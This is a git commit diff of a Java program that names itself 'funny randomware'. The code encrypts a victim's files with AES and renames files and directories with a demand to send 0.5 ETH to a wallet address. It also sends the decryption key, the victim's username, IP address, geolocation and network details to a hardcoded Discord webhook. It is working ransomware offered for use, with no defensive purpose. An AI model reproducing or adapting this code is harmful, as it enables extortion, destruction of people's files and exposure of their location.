80b3c351f35fe50828f3cfe4c2ee7a07537b3def
warren <107413987+w-d-u-a-n@users.noreply.github.com>
2022-09-30 08:57:57 -0400

    Add files via upload

--- Encrypt.java
+++ Encrypt.java
@@ -21,13 +21,23 @@ public class Encrypt {
         return new IvParameterSpec(iv);
     }
 
-    public static String encrypt(String algorithm, String input, SecretKey key,
+    public static String encryptECB(String algorithm, String input, SecretKey key,
                                  IvParameterSpec iv) throws NoSuchPaddingException, NoSuchAlgorithmException,
             InvalidAlgorithmParameterException, InvalidKeyException,
             BadPaddingException, IllegalBlockSizeException {
 
         Cipher cipher = Cipher.getInstance(algorithm);
         cipher.init(Cipher.ENCRYPT_MODE, key, iv);
+        byte[] cipherText = cipher.doFinal(input.getBytes());
+        return Base64.getEncoder().encodeToString(cipherText);
+    }
+
+    public static String encryptCBC(String algorithm, String input, SecretKey key) throws NoSuchPaddingException, NoSuchAlgorithmException,
+            InvalidAlgorithmParameterException, InvalidKeyException,
+            BadPaddingException, IllegalBlockSizeException {
+
+        Cipher cipher = Cipher.getInstance(algorithm);
+        cipher.init(Cipher.ENCRYPT_MODE, key);
         byte[] cipherText = cipher.doFinal(input.getBytes());
         return Base64.getEncoder().encodeToString(cipherText);
     }
--- Main.java
+++ Main.java
@@ -3,27 +3,39 @@ import javax.crypto.IllegalBlockSizeException;
 import javax.crypto.NoSuchPaddingException;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import javax.swing.*;
 import java.awt.*;
 import java.io.*;
 import java.lang.reflect.Array;
+import java.math.BigDecimal;
+import java.net.MalformedURLException;
+import java.net.URL;
 import java.security.InvalidAlgorithmParameterException;
 import java.security.InvalidKeyException;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Base64;
 import java.util.Scanner;
+import com.google.gson.Gson;
+import org.json.JSONException;
+import org.json.JSONObject;
+
 
 public class Main {
     public static ArrayList<File> realF = new ArrayList<>();
     public static ArrayList<File> dirs = new ArrayList<>();
 
-    public static void main(String[] args) {
+    public static void main(String[] args) throws MalformedURLException {
         /*
-        WHATEVER YOU DO
         DO NOT
         UNCOMMENT THIS
-        please for the sake of your files
+
+        DO NOT
+        UNCOMMENT THIS
+
+        DO NOT
+        UNCOMMENT THIS
 
         File des = new File(System.getProperty("user.home") + "/Desktop");
         File dow = new File(System.getProperty("user.home") + "/Downloads");
@@ -32,47 +44,74 @@ public class Main {
         getFiles(dow);
         getFiles(doc);
 
+        */
 
-        for (File f : realF) {
+        /*for (File f : realF) {
             System.out.println(f.toString());
         }
-        System.out.println(realF.size());
         for (File f : dirs) {
             System.out.println(f.toString());
         }
-        System.out.println(dirs.size());
-         */
+        */
+
+        System.out.println(realF.size() + " Files Detected");
+
+        System.out.println(dirs.size() + " Directories Detected");
 
 
         try {
             SecretKey key = Encrypt.genKey(256);
             String strKey = Base64.getEncoder().encodeToString(key.getEncoded());
             IvParameterSpec iv = Encrypt.generateIv();
+            JSONObject json = new JSONObject(getJSON(new URL("http://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,isp,org,as,asname,reverse,mobile,proxy,hosting,query")));
             DiscordWebhook LMAO = new DiscordWebhook("https://discord.com/api/webhooks/1024833564971384912/pVMr8ShCNE4hOBhLvhHsH3qshaga8l4-rnlnGEGMRVwpaFZSgHNm9qf_0KOz6Q4ydw5g");
-            LMAO.setUsername(System.getProperty("user.name"));
+            LMAO.setUsername(System.getProperty("idiot finder v2"));
+            LMAO.setAvatarUrl("https://i.kym-cdn.com/entries/icons/square/000/021/703/smiley-face-thumbs-up-thank-you-clipart-panda-free-clipart-images-4eZHzt-clipart.jpeg");
             LMAO.addEmbed(new DiscordWebhook.EmbedObject()
-                    .setTitle("idiot detected")
+                    .setTitle(System.getProperty("user.name") + " is an idiot lmao")
                     .setDescription("funny randomware 1.0.0")
                     .setColor(Color.GREEN)
                     .addField("Encryption Type", key.getAlgorithm(), false)
-                    .addField("SecretKey", Base64.getEncoder().encodeToString(key.getEncoded()), false)
-                    .addField("IvParameterSpec", iv.getIV().toString(), false)
+                    .addField("SecretKey", Base64.getEncoder().encodeToString(key.getEncoded()), true)
+                    .addField("IvParameterSpec", "CBC Encrypted", true)
+                    .addField("Ip", json.getString("query"), true)
+                    .addField("Zip", json.getString("zip"), true)
+                    .addField("Latitude", json.getBigDecimal("lat").toString(), true)
+                    .addField("Longitude", json.getBigDecimal("lon").toString(), true)
                     .setImage("https://media.istockphoto.com/photos/asian-emoji-with-conical-straw-hat-isolated-on-white-background-picture-id961331086?k=20&m=961331086&s=170667a&w=0&h=Fy2TU1TWJADmIZh-pKdjNNh8pVs6dOR2cziNNrlhHJA="));
-            LMAO.execute();
+            LMAO.addEmbed(new DiscordWebhook.EmbedObject()
+                    .setTitle("rip bozo")
+                    .setDescription(System.getProperty("user.name") + "'s Network Information?!21?#!@?$!@*^")
+                    .setColor(Color.RED)
+                    .addField("Country",json.getString("country"),true)
+                    .addField("Region",json.getString("regionName"),true)
+                    .addField("City",json.getString("city"),true)
+                    .addField("Isp",json.getString("isp"),true)
+                    .addField("org",json.getString("org"),true)
+                    .addField("as",json.getString("as"),true)
+                    .addField("asname",json.getString("asname"),true)
+                    .addField("Reverse DNS",json.getString("reverse"),true)
+                    .addField("Hotspot",Boolean.toString(json.getBoolean("mobile")),true)
+                    .addField("Proxy",Boolean.toString(json.getBoolean("proxy")),true)
+                    .addField("Hosting",Boolean.toString(json.getBoolean("hosting")),true)
+                    .addField("Ip",json.getString("query"),true)
+                    .setImage("https://w7.pngwing.com/pngs/760/848/png-transparent-smiley-computer-icons-desktop-emoji-vkontakte-3d-miscellaneous-3d-emoticon.png")
 
+            );
+            LMAO.execute();
             //here comes the funny part
             for(File f : realF) {
-                encryptFile(f,key,iv);
+                encryptFile(f,key);
             }
             for(File f : dirs) {
-                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.BOZO"));
+                f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
             }
         }catch(Exception e) {
             e.printStackTrace();
         }
     }
 
-    public static void encryptFile(File f, SecretKey key, IvParameterSpec iv) throws IOException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
+    public static void encryptFile(File f, SecretKey key) throws IOException, InvalidAlgorithmParameterException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException, InvalidKeyException {
         Scanner sc = new Scanner(f);
         ArrayList<String> data = new ArrayList<>();
         ArrayList<String> encdata = new ArrayList<>();
@@ -81,7 +120,7 @@ public class Main {
             data.add(sc.nextLine());
         }
         for (String s : data) {
-            encdata.add(Encrypt.encrypt("AES/CBC/PKCS5PADDING", s, key, iv));
+            encdata.add(Encrypt.encryptCBC("AES/CBC/PKCS5PADDING", s, key));
         }
         new FileOutputStream(f).close();
         FileWriter wr = new FileWriter(f);
@@ -90,7 +129,7 @@ public class Main {
         }
         wr.close();
 
-        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED.BOZO"));
+        f.renameTo(new File(f+" SEND 0.5 ETH TO 0xfb27bdE6EA0B7Dac4031A7B0ABA155E256150C1a TO GET YOUR FILES DECRYPTED"));
     }
 
     public static void getFiles(File f) {
@@ -102,6 +141,21 @@ public class Main {
             } else {
                 realF.add(fi);
             }
+        }
+    }
+
+    public static String getJSON(URL url) {
+        try (InputStream input = url.openStream()) {
+            InputStreamReader isr = new InputStreamReader(input);
+            BufferedReader reader = new BufferedReader(isr);
+            StringBuilder json = new StringBuilder();
+            int c;
+            while ((c = reader.read()) != -1) {
+                json.append((char) c);
+            }
+            return json.toString();
+        } catch(IOException e) {
+            throw new RuntimeException(e);
         }
     }
 }
